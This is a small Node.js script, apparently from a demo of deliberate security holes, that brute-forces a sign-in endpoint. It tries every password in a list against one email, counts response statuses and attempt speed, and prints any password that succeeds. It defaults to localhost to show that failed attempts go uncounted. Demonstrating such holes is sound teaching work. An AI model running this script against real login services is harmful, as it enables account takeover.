// demo0/brute.mjs — hole 6: nothing counts failed attempts, so a script can try a whole password list.
// Usage: node demo0/brute.mjs <email> <password-list.txt>
import fs from 'node:fs';
const BASE = process.env.BASE ?? 'http://localhost:4800';
const [email, file] = process.argv.slice(2);
const list = fs.readFileSync(file, 'utf8').split('\n').filter(Boolean);
const statuses = {};
const t0 = performance.now();
let found = null;
let i = 0;
for (; i < list.length && !found; i++) {
  const res = await fetch(BASE + '/sign-in', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email, password: list[i] }),
  });
  statuses[res.status] = (statuses[res.status] ?? 0) + 1;
  if (res.status === 200) found = list[i];
  await res.arrayBuffer();
}
const s = (performance.now() - t0) / 1000;
console.log(`${email}: ${i} attempts in ${s.toFixed(2)} s (${Math.round(i / s)} attempts/s), statuses ${JSON.stringify(statuses)}`);
console.log(found ? `PASSWORD FOUND at attempt ${i}: ${JSON.stringify(found)}` : 'not in the list');
